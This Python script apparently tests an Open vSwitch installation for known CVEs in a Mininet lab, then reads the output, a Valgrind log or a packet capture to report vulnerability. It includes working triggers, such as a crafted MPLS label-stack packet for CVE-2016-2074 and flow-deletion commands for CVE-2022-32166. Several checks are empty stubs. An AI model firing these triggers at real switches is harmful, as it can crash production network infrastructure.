import os
import subprocess
import re
import ovs_config
from mininet.log import setLogLevel
from mininet.cli import CLI
from time import sleep
from datetime import datetime
from mininet_setup import MininetNetwork

def cve_2016_2074():
    setLogLevel('info')

    mininet = MininetNetwork()
    mininet.mininet_1h_1s()
   
    mpls = 'sudo ovs-appctl ofproto/trace s1 in_port=1 ffffffffffff0000000000008847$(for i in $(seq 512); do printf cccc; done)'
    process = subprocess.Popen(mpls, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
    output, _ = process.communicate()
    print(output.decode())

    mininet.stop_mininet()

    vulnerable = False
    if 'ovs-vswitchd: transaction error' in output.decode():
        vulnerable = True

    mininet.cleanup_network()

    return vulnerable

def cve_2016_10377():
    setLogLevel('info')
    os.system('gcc packets/cve_2016_10377.c -o packets/cve_2016_10377')

    log_path = ovs_config.start_valgrind('cve_2016_10377')

    mininet = MininetNetwork()
    mininet.mininet_2h_1s()

    #mininet.net['h2'].cmd('sudo wireshark -i h2-eth0 -k &')
    #sleep(5)
    mininet.net['h1'].cmd('./packets/cve_2016_10377')
    #sleep(10)

    #mininet.net['h2'].cmd('sudo killall wireshark')
    mininet.stop_mininet()

    vulnerable = False
    with open(log_path, 'r') as log_file:
        log_content = log_file.read()
        error = re.compile(r'Uninitialised value was created by a stack allocation')
        if error.search(log_content):
            vulnerable = True

    mininet.cleanup_network()

    ovs_config.valgrind_cleanup()

    os.system('rm packets/cve_2016_10377')

    return vulnerable

def cve_2017_9264():
    setLogLevel('info')
    
    #mininet = MininetNetwork()
    #mininet.mininet_2h_1s()

    #mininet.stop_mininet()
    #mininet.cleanup_network()

    vulnerable = False
    return vulnerable

def cve_2020_27827():
    #setLogLevel('info')

    #mininet = MininetNetwork()
    #mininet.mininet_1h_1s()

    #mininet.stop_mininet()
    #mininet.cleanup_network()

    vulnerable = False
    return vulnerable

def cve_2020_35498():
    setLogLevel('info')
    os.system('gcc packets/cve_2020_35498.c -o packets/cve_2020_35498')

    mininet = MininetNetwork()
    mininet.mininet_2h_1s()

    mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=5,ip,ip_dst=10.0.0.1,actions=1')
    mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=5,ip,ip_dst=10.0.0.2,actions=2')
    mininet.net['s1'].cmd('sudo ovs-ofctl add-flow s1 priority=0,actions=drop')
    #mininet.net['h1'].cmd('arp -s 10.0.0.2 00:00:00:00:00:02')
    #mininet.net['h2'].cmd('arp -s 10.0.0.1 00:00:00:00:00:01')

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    cve_pcap_filename = "logs/cve_2020_35498_{}.pcap".format(timestamp)

    mininet.net['h2'].cmd('tcpdump -i h2-eth0 -w {} &'.format(cve_pcap_filename))    
    sleep(2)
    mininet.net['h1'].cmd('./packets/cve_2020_35498')
    sleep(1)
    mininet.net['h2'].cmd('sudo pkill -f tcpdump')

    mininet.stop_mininet()

    vulnerable = False
    tcpdump_output = subprocess.check_output(['tcpdump', '-r', cve_pcap_filename, '-n'], text=True)
    packet = re.compile(r'10.0.0.1 > 10.0.0.2:*')
    if not packet.search(tcpdump_output):
        vulnerable = True

    mininet.cleanup_network()

    os.system('rm packets/cve_2020_35498')

    return vulnerable

def cve_2021_3905():
    vulnerable = False
    return vulnerable

def cve_2022_4337():
    #setLogLevel('info')

    #mininet = MininetNetwork()
    #mininet.mininet_1h_1s()

    #mininet.stop_mininet()
    #mininet.cleanup_network()

    vulnerable = False
    return vulnerable

def cve_2022_4338():
    #setLogLevel('info')

    #mininet = MininetNetwork()
    #mininet.mininet_1h_1s()

    #mininet.stop_mininet()
    #mininet.cleanup_network()

    vulnerable = False
    return vulnerable

def cve_2022_32166():
    os.system('ovs-vsctl add-br br-int')
    os.system('ovs-ofctl add-flow br-int "table=0,cookie=0x1234,priority=10000,icmp,actions=drop"')
    os.system('ovs-ofctl --strict del-flows br-int "table=0,cookie=0x1234/-1,priority=10000"')

    os.system('ovs-vsctl del-br br-int')
    
    vulnerable = False
    return vulnerable

def cve_2023_1668():
    vulnerable = False
    return vulnerable

# This is for testing purposes:
if __name__ == '__main__':
    #test1 = cve_2016_2074()
    #test2 = cve_2016_10377()
    test = cve_2020_35498()
    print(test)
    #cve_2022_32166()
    #print(test1)
    #print(test2)
  